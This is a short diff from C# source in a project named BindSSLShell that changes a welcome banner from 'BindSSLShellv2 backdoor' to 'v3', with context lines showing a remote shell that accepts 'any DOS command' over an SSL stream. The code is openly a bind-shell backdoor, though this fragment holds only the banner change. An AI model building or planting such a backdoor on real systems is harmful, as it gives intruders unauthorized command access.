@@ -100,7 +100,7 @@ namespace BindSSLShell
                 outStream = new StreamWriter(sslStream);
                 outStream.AutoFlush = true;
 
-                outStream.WriteLine("Welcome to BindSSLShellv2 backdoor. Issue help to get help\n");
+                outStream.WriteLine("Welcome to BindSSLShellv3 backdoor. Issue help to get help\n");
                 outStream.WriteLine("or issue any DOS command...\n");
                 getInput();
                 dropConnection();
